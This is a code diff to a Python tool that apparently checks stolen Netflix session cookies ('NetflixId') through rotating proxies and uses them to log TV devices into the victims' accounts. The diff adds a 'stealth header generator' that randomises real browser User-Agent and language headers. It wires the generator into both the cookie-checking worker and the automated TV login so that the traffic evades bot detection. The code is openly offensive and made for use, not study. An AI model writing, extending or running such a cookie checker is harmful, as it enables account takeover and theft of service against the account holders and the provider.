@@ -133,6 +133,50 @@ def get_public_ip(proxies):
     return local_ip, proxy_info
 
 # ==========================================
+# --- STEALTH HEADER GENERATOR ---
+# ==========================================
+def get_random_headers():
+    # Curated list of REAL User-Agents and their exact matching Accept headers
+    browser_profiles = [
+        # Windows Chrome
+        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'),
+        # macOS Safari
+        ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+        # macOS Chrome
+        ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
+        # Windows Firefox
+        ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
+        # Android Chrome
+        ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'),
+        # iOS Safari
+        ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+        # Linux Chrome
+        ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8')
+    ]
+    
+    # Realistic human language settings
+    languages = [
+        "en-US,en;q=0.9",
+        "en-GB,en;q=0.9,en-US;q=0.8",
+        "es-ES,es;q=0.9,en;q=0.8",
+        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
+        "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+        "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"
+    ]
+    
+    ua, accept = random.choice(browser_profiles)
+    lang = random.choice(languages)
+    
+    return {
+        'User-Agent': ua,
+        'Accept': accept,
+        'Accept-Language': lang
+    }
+
+
+
+# ==========================================
 # --- FLAWLESS COOKIE EXTRACTOR ---
 # ==========================================
 def extract_ids_from_bytes(file_bytes: bytes, filename: str) -> set:
@@ -381,10 +425,9 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
 
             try:
                 session = requests.Session()
-                session.headers.update({
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                })
+                
+                # --- NEW: Inject heavily randomized stealth headers! ---
+                session.headers.update(get_random_headers())
                 
                 session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
                 
@@ -500,12 +543,16 @@ def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tu
     clean_id = netflix_id.replace("NetflixId=", "").strip()
     session = requests.Session()
     
+    # --- NEW: Generate stealth fingerprint for TV Auth ---
+    stealth_headers = get_random_headers()
+
     headers = {
-        "authority":                  "www.netflix.com",
-        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "accept-language":            "en-US,en;q=0.9",
-        "user-agent":                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+        "authority":       "www.netflix.com",
+        "accept":          stealth_headers["Accept"],
+        "accept-language": stealth_headers["Accept-Language"],
+        "user-agent":      stealth_headers["User-Agent"],
     }
+
     
     session.headers.update(headers)
     session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
